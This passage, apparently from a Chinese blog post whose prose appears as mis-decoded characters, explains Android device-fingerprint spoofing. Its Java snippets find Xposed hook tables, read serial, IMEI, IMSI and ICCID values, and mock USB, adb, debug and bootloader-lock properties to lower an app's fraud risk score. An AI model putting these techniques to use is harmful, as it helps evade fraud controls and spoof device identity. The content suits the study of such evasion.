å³å¯ã€‚</p></blockquote><p><code>sHookedMethodCallbacks</code>é‡Œé¢ä¿å­˜äº†XPosedå…¨éƒ¨çš„Hookæ–¹æ³•ä¿¡æ¯ï¼Œç”¨äºçŸ³é”¤å½“å‰æ–¹æ³•æ˜¯å¦è¢«Hookã€‚è·å–è¢«Hookæ–¹æ³•å…·ä½“å¦‚ä¸‹ï¼š</p><blockquote><p><strong>XposedHelpers-&gt;methodCache ä¸å»ºè®®ä½¿ç”¨ï¼Œå¦‚æœæ”»å‡»è€…ä½¿ç”¨äº†XposedBridge-&gt;HookAllmethod çš„è¯ï¼Œå¯èƒ½ä¼šå¯¼è‡´Hookæ–¹æ³•ä¸ŠæŠ¥çš„é—æ¼ã€‚</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">private void getHookItemDemo() &#123;</span><br><span class="line">    ArrayList&lt;Object&gt; choose = ChooseUtils.choose(ClassLoader.class, true);</span><br><span class="line">    for(Object obj :choose)&#123;</span><br><span class="line">        ClassLoader clazzloader = (ClassLoader) obj;</span><br><span class="line">        Class&lt;?&gt; clazzXh = null;</span><br><span class="line">        Class&lt;?&gt; clazzBR = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            Log.e(&quot;Test&quot;, &quot;-----------------------------------------------------------------&quot;);</span><br><span class="line"></span><br><span class="line">            clazzBR =  Class.forName(&quot;de.robv.android.xposed.XposedBridge&quot;,false,clazzloader);</span><br><span class="line">            Field callbacksField = clazzBR.getDeclaredField(&quot;sHookedMethodCallbacks&quot;);</span><br><span class="line">            callbacksField.setAccessible(true);</span><br><span class="line">            Map&lt;Member, Object&gt; callback = (Map&lt;Member, Object&gt;) callbacksField.get(null);</span><br><span class="line"></span><br><span class="line">            for(Member key :callback.keySet()) &#123;</span><br><span class="line">                Log.e(&quot;Test&quot;, &quot;sHookedMethodCallbacks  &quot; + key.toString());</span><br><span class="line">            &#125;</span><br><span class="line">            Log.e(&quot;Test&quot;, &quot;-----------------------------------------------------------------&quot;);</span><br><span class="line"></span><br><span class="line">            return;</span><br><span class="line">        &#125; catch (Throwable e) &#123;</span><br><span class="line">            Log.e(&quot;Test&quot;,&quot;find errror &quot;+e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å› ä¸ºæ­£å¸¸çš„ä½¿ç”¨zygiskçš„Xposed hookçš„classloaderå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚         BootClassLoader (ç³»ç»Ÿç±»)             â”‚</span><br><span class="line">â”‚    (String, Object, Activity...)            â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">                â”‚ parent</span><br><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚      PathClassLoader (ç³»ç»Ÿ Framework)        â”‚</span><br><span class="line">â”‚  âœ… XposedBridge.jar è¢«æ³¨å…¥åˆ°è¿™é‡Œ              â”‚</span><br><span class="line">â”‚  âœ… æ‰€æœ‰ App å…±äº«è¿™ä¸ª ClassLoader              â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">                â”‚ parent</span><br><span class="line">     â”â”â”â”â”â”â”â”â”â”â”â”»â”â”â”â”â”â”â”â”â”â”â”“</span><br><span class="line">     â–¼                      â–¼</span><br><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚   App1 çš„       â”‚    â”‚   App2 çš„       â”‚</span><br><span class="line">â”‚  ClassLoader   â”‚    â”‚  ClassLoader   â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br></pre></td></tr></table></figure><p>è€Œä½¿ç”¨riruçš„<code>EdXposed</code> å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚         BootClassLoader                     â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">                â”‚</span><br><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚      ç³»ç»Ÿ PathClassLoader                    â”‚</span><br><span class="line">â”‚  âŒ æ²¡æœ‰ XposedBridgeï¼ˆéšè”½æ€§ï¼‰               â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">                â”‚</span><br><span class="line">     â”â”â”â”â”â”â”â”â”â”â”â•‹â”â”â”â”â”â”â”â”â”â”â”“</span><br><span class="line">     â–¼          â–¼          â–¼</span><br><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚  App çš„     â”‚ â”‚ ğŸ”’ éšè—çš„ç‹¬ç«‹     â”‚ â”‚  å…¶ä»–...   â”‚</span><br><span class="line">â”‚ ClassLoaderâ”‚ â”‚   ClassLoader    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ XposedBridge.jar â”‚</span><br><span class="line">            â”‚  åŠ è½½åœ¨è¿™é‡Œ        â”‚</span><br><span class="line">            â”‚ â— æ²¡æœ‰ä»»ä½•åœ°æ–¹    â”‚</span><br><span class="line">            â”‚    å¼•ç”¨å®ƒï¼        â”‚</span><br><span class="line">            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ä»»ä½•çš„AppåŠ è½½äº†ç›¸åº”çš„<code>ClassLoader</code>ï¼Œå› æ­¤éœ€è¦é€šè¿‡å†…å­˜æ¼«æ¸¸çš„æ–¹å¼è·å–æ‰€æœ‰çš„<code>ClassLoader</code>ï¼Œç„¶åå†åŠ è½½ç›¸åº”çš„ç±»</p></blockquote><h4 id="serialï¼ˆæ™®é€šï¼‰"><a href="#serialï¼ˆæ™®é€šï¼‰" class="headerlink" title="serialï¼ˆæ™®é€šï¼‰"></a>serialï¼ˆæ™®é€šï¼‰</h4><p>è¿™ä¸ªå˜é‡åœ¨é«˜ç‰ˆæœ¬é‡Œé¢åŸºæœ¬å·²ç»æ‹¿ä¸åˆ°ï¼ŒåŠæ—¶æ‹¿åˆ°äº†ä¹Ÿæ˜¯ä¸€ä¸ªunknowï¼Œä½†æ˜¯ä¹Ÿéœ€è¦å…¼å®¹ä½ç‰ˆæœ¬çš„Android</p><h5 id="get"><a href="#get" class="headerlink" title="get:"></a>get:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123; </span><br><span class="line">        <span class="keyword">return</span> Build.getSerial();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Mock-1"><a href="#Mock-1" class="headerlink" title="Mock:"></a>Mock:</h5><p>å¦‚æœè¿”å›çš„ä¸æ˜¯ç©ºï¼Œå¹¶ä¸”ä¸æ˜¯ <code>unknow</code> æˆ–è€…<code>UNKNOWN</code>ï¼Œéšæœºä¸€ä»½åŸå§‹é•¿åº¦çš„å­—ç¬¦ä¸²å³å¯ã€‚å¦å¤–è¯¥å­—æ®µåŒä¸Šï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¯¹<code>IPC</code>ç±»è¿›è¡Œå¤„ç†ï¼Œç›´æ¥<code>Hook IPC</code>å¯¹è±¡<code>getSerialForPackage</code> æ–¹æ³•å³å¯ ï¼Œå®ç°æ–¹æ³•å…·ä½“å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSerial</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">IDeviceIdentifiersPolicyService</span> <span class="variable">service</span> <span class="operator">=</span> IDeviceIdentifiersPolicyService.Stub</span><br><span class="line">            .asInterface(ServiceManager.getService(Context.DEVICE_IDENTIFIERS_SERVICE));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Application</span> <span class="variable">application</span> <span class="operator">=</span> ActivityThread.currentApplication();</span><br><span class="line">        <span class="type">String</span> <span class="variable">callingPackage</span> <span class="operator">=</span> application != <span class="literal">null</span> ? application.getPackageName() : <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> service.getSerialForPackage(callingPackage, <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        e.rethrowFromSystemServer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> UNKNOWN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="IMEI-IMSI-ICCID-Line1Number-æ™®é€š"><a href="#IMEI-IMSI-ICCID-Line1Number-æ™®é€š" class="headerlink" title="IMEI , IMSI ,ICCID,Line1Number (æ™®é€š)"></a>IMEI , IMSI ,ICCID,Line1Number (æ™®é€š)</h4><h5 id="getï¼š"><a href="#getï¼š" class="headerlink" title="getï¼š"></a>getï¼š</h5><ul><li><p><code>IMEI</code> ä¸ä½ çš„æ‰‹æœºæ˜¯ç»‘å®šå…³ç³» ç”¨äºåŒºåˆ«ç§»åŠ¨ç»ˆç«¯è®¾å¤‡ï¼Œ<code>DeviceId</code>å°±æ˜¯IMEI</p></li><li><p><code>IMSI</code> ä¸ä½ çš„æ‰‹æœºå¡æ˜¯ç»‘å®šå…³ç³» ç”¨äºåŒºåˆ«ç§»åŠ¨ç”¨æˆ·çš„æœ‰æ•ˆä¿¡æ¯ IMSIæ˜¯ç”¨æˆ·çš„æ ‡è¯†ã€‚</p></li><li><p><code>ICCID</code>æ˜¯å¡çš„æ ‡è¯†ï¼Œç”±20ä½æ•°å­—ç»„æˆ</p></li><li><p><code>ICCID</code>åªæ˜¯ç”¨æ¥<strong>åŒºåˆ«SIMå¡</strong>ï¼Œ<strong>ä¸ä½œæ¥å…¥ç½‘ç»œçš„é‰´æƒè®¤è¯</strong>ã€‚è€ŒIMSIåœ¨æ¥å…¥ç½‘ç»œçš„æ—¶å€™ï¼Œä¼šåˆ°è¿è¥å•†çš„æœåŠ¡å™¨ä¸­è¿›è¡ŒéªŒè¯ã€‚<code>SimSerialNumber</code>å°±æ˜¯ICCID</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return the phone status.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;Must hold &#123;<span class="doctag">@code</span> &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * IMEI ä¸ä½ çš„æ‰‹æœºæ˜¯ç»‘å®šå…³ç³» ç”¨äºåŒºåˆ«ç§»åŠ¨ç»ˆç«¯è®¾å¤‡</span></span><br><span class="line"><span class="comment"> * IMSI ä¸ä½ çš„æ‰‹æœºå¡æ˜¯ç»‘å®šå…³ç³» ç”¨äºåŒºåˆ«ç§»åŠ¨ç”¨æˆ·çš„æœ‰æ•ˆä¿¡æ¯ IMSIæ˜¯ç”¨æˆ·çš„æ ‡è¯†ã€‚</span></span><br><span class="line"><span class="comment"> * DeviceIdå°±æ˜¯IMEI</span></span><br><span class="line"><span class="comment"> * DeviceId = 99000311726612&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * DeviceSoftwareVersion = 00&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * Line1Number =&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * NetworkCountryIso = cn&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * NetworkOperator = 46003&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * NetworkOperatorName = ä¸­å›½ç”µä¿¡&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * NetworkType = 6&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * PhoneType = 2&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * SimCountryIso = cn&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * SimOperator = 46003&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * SimOperatorName = ä¸­å›½ç”µä¿¡&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * ICCID ICCIDæ˜¯å¡çš„æ ‡è¯†ï¼Œç”±20ä½æ•°å­—ç»„æˆ</span></span><br><span class="line"><span class="comment"> * ICCIDåªæ˜¯ç”¨æ¥åŒºåˆ«SIMå¡ï¼Œä¸ä½œæ¥å…¥ç½‘ç»œçš„é‰´æƒè®¤è¯ã€‚è€ŒIMSIåœ¨æ¥å…¥ç½‘ç»œçš„æ—¶å€™ï¼Œä¼šåˆ°è¿è¥å•†çš„æœåŠ¡å™¨ä¸­è¿›è¡ŒéªŒè¯ã€‚</span></span><br><span class="line"><span class="comment"> * SimSerialNumberå°±æ˜¯ICCID</span></span><br><span class="line"><span class="comment"> * SimSerialNumber = 89860315045710604022&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * SimState = 5&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * SubscriberId(IMSI) = 460030419724900&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * VoiceMailNumber = *86&lt;br&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressLint(&quot;HardwareIds&quot;)</span></span><br><span class="line"><span class="meta">@RequiresPermission(READ_PHONE_STATE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPhoneStatus</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">TelephonyManager</span> <span class="variable">tm</span> <span class="operator">=</span> getTelephonyManager();</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//noinspection ConstantConditions</span></span><br><span class="line">    str += <span class="string">&quot;DeviceId(IMEI) = &quot;</span> + tm.getDeviceId() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;DeviceSoftwareVersion = &quot;</span> + tm.getDeviceSoftwareVersion() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;Line1Number = &quot;</span> + tm.getLine1Number() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;NetworkCountryIso = &quot;</span> + tm.getNetworkCountryIso() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;NetworkOperator = &quot;</span> + tm.getNetworkOperator() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;NetworkOperatorName = &quot;</span> + tm.getNetworkOperatorName() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;NetworkType = &quot;</span> + tm.getNetworkType() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;PhoneType = &quot;</span> + tm.getPhoneType() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SimCountryIso = &quot;</span> + tm.getSimCountryIso() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SimOperator = &quot;</span> + tm.getSimOperator() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SimOperatorName = &quot;</span> + tm.getSimOperatorName() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SimSerialNumber = &quot;</span> + tm.getSimSerialNumber() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SimState = &quot;</span> + tm.getSimState() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SubscriberId(IMSI) = &quot;</span> + tm.getSubscriberId() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;VoiceMailNumber = &quot;</span> + tm.getVoiceMailNumber();</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Mockï¼š-1"><a href="#Mockï¼š-1" class="headerlink" title="Mockï¼š"></a>Mockï¼š</h5><p><code>TelephonyManager</code>æºç ï¼š<a href="https://github.com/aosp-mirror/platform_frameworks_base/blob/master/telephony/java/android/telephony/TelephonyManager.java">https://github.com/aosp-mirror/platform_frameworks_base/blob/master/telephony/java/android/telephony/TelephonyManager.java</a></p><p>å°è¯•ä¼˜å…ˆ<code>Hook ipc</code>å³å¯</p><h4 id="Buildç›¸å…³ï¼ˆæ¬¡è¦ï¼‰"><a href="#Buildç›¸å…³ï¼ˆæ¬¡è¦ï¼‰" class="headerlink" title="Buildç›¸å…³ï¼ˆæ¬¡è¦ï¼‰"></a>Buildç›¸å…³ï¼ˆæ¬¡è¦ï¼‰</h4><p>Buildé‡Œé¢è¿˜æ˜¯æœ‰å¾ˆå¤šæœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ¯”å¦‚æ‰‹æœºæ˜¯å¦å¼€å¯adb ,usbæ¥å£çš„çŠ¶æ€ä¹‹ç±»çš„ã€‚æˆ‘ä»¬ä¸»è¦å°†Buildé‡Œé¢åˆ†ä¸ºä¸¤éƒ¨åˆ† ã€‚æŒ‡çº¹ç›¸å…³åˆåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œ<strong>å•ä¸€å­—æ®µ &#x2F;å¤åˆå­—æ®µ</strong>ã€‚</p><ol><li>é…ç½®ç›¸å…³</li><li>æŒ‡çº¹ç›¸å…³<ul><li>å•ä¸€å­—æ®µï¼ˆåªæœ‰ä¸€ä¸ªè®¾å¤‡ä¿¡æ¯ï¼‰</li><li>å¤åˆå­—æ®µï¼ˆå¤šä¸ªå•ä¸€å­—æ®µå¤åˆè€Œæˆï¼‰</li></ul></li></ol><p>è¿™ä¸ªå•ç‹¬é€šè¿‡Javaå±‚å»ä¿®æ”¹æ˜¯å®Œå…¨ä¸å¤Ÿçš„ï¼Œåº•å±‚èµ°çš„æ˜¯<code>system_property_get</code> è¿™ä¸ªæ–¹æ³•ï¼ˆåœ¨nativeæŒ‡çº¹éƒ¨åˆ†ä¼šè¯¦ç»†ä»‹ç»ï¼‰ã€‚</p><p>è¿˜æœ‰è¦é˜²æ­¢popen getprop è¿™ç§æ–¹æ³•å»æ‰«æå…¨éƒ¨çš„Buildç›¸å…³å‚æ•°ï¼ˆpopen getprop åœ¨popenç›¸å…³ä¼šè¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œåªä»‹ç»Javaåº”è¯¥å¦‚ä½•å¤„ç†ï¼‰ï¼Œè¿™ä¸ªBuildç›¸å…³éœ€è¦é‡ç‚¹å…³æ³¨ï¼Œä»–åœ¨<strong>Androidåº•å±‚å®ç°ç±»ä¼¼æ ‘çŠ¶ç»“æ„ã€‚ä¹Ÿå°±æ˜¯è¯´å¾ˆå¤šæ ‘æéƒ½ä¼šæœ‰ç›¸åŒçš„å†…å®¹ã€‚ç›®å‰æ‰€æœ‰çš„ä½œç”¨åŸŸä¸€å…±æœ‰ä¸ƒç§ã€‚</strong></p><p>ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚å¸¸è§çš„fingerprintå¤åˆå­—æ®µç³»åˆ— ï¼Œå°±åˆ†ä¸ºå¦‚ä¸‹ä¸ƒç§ä½œç”¨åŸŸã€‚</p><ul><li><code>ro.build.fingerprint/</code></li><li><code>ro.build.build.fingerprint/</code></li><li><code>ro.bootimage.build.fingerprint/</code></li><li><code>ro.odm.build.fingerprint/</code></li><li><code>ro.product.build.fingerprint/</code></li><li><code>ro.system_ext.build.fingerprint/</code></li><li><code>ro.system.build.fingerprint/</code></li><li><code>ro.vendor.build.fingerprint/</code></li></ul><p>ä½œç”¨åŸŸåˆ†åˆ«å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static final String Region[] = &#123;  </span><br><span class="line">      &quot;build&quot;, &quot;bootimage&quot;, &quot;odm&quot;, &quot;product&quot;, &quot;system_ext&quot;, &quot;system&quot;, &quot;vendor&quot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„å€¼æ„æˆé¡ºåºä¹Ÿéƒ½æ˜¯ä¸€æ ·ï¼Œæ‰€ä»¥Hookçš„è¯ä¹Ÿéœ€è¦å…¨éƒ¨è¿›è¡Œhookï¼Œåªå¤„ç†å•ä¸€æ˜¯æ²¡ç”¨çš„ã€‚å› ä¸ºå¾ˆå¤šå¤§å‚åšé‡‡é›†ï¼Œä¸ä¼šåªæ”¶é›†ä¸€é¡¹ã€‚</p><p>ä¼šä¸ƒä¸ªä½œç”¨åŸŸéƒ½è¿›è¡Œæ”¶é›†ã€‚</p><h5 id="é…ç½®ç›¸å…³ï¼š"><a href="#é…ç½®ç›¸å…³ï¼š" class="headerlink" title="é…ç½®ç›¸å…³ï¼š"></a>é…ç½®ç›¸å…³ï¼š</h5><p>å¸¸è§çš„é…ç½®å¦‚ä¸‹ï¼Œè¿™äº›å­—æ®µå…¶å®ä¿®æ”¹ä¸ä¿®æ”¹ä¸é‡è¦ï¼Œå› ä¸ºå¾ˆå¤šå¤§å‚å¦‚æœæ‰‹æœºå¼€äº†å¼€å‘è€…é€‰é¡¹æˆ–è€…debugæ¨¡å¼ä¹‹ç±»çš„ã€‚</p><p><strong>ä¼šå¢åŠ å½“å‰æ‰‹æœºçš„é£é™©å€¼ã€‚</strong>æ‰€ä»¥å°è¯•è¿›è¡ŒMock å’Œä¿®æ”¹ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;sys.usb.config&quot;, &quot;none&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;sys.usb.state&quot;, &quot;none&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;persist.sys.usb.config&quot;, &quot;none&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;persist.sys.usb.qmmi.func&quot;, &quot;none&quot;, null, true);</span><br><span class="line">//è¿™ä¸¤ä¸ªconfigå¯èƒ½ä¼šæ‹¿ä¸åˆ°,æ‹¿ä¸åˆ°åˆ™ä¸è¿›è¡Œmock</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;vendor.usb.mimode&quot;, &quot;none&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;persist.vendor.usb.config&quot;, &quot;none&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;ro.debuggable&quot;, &quot;0&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;init.svc.adbd&quot;, &quot;stopped&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;ro.secure&quot;, &quot;1&quot;, null, true);</span><br><span class="line">//æ‰‹æœºè§£é”çŠ¶æ€</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;ro.boot.flash.locked&quot;, &quot;1&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;sys.oem_unlock_allowed&quot;, &quot;1&quot;, null, true);</span><br></pre></td></tr></table></figure><h5 id="å•ä¸€å­—æ®µ"><a href="#å•ä¸€å­—æ®µ" class="headerlink" 